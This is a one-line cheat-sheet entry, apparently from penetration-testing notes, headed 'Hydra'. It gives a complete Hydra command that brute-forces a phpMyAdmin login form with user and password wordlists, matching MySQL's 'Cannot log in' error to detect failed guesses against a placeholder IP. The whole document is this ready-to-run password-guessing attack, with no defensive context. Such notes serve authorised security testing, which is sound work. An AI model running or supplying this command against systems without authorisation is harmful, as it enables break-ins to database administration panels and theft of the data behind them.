# Hydra

`$ hydra -L users.lst -P passwords.lst http-form-post "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server" -vV -f <IP>`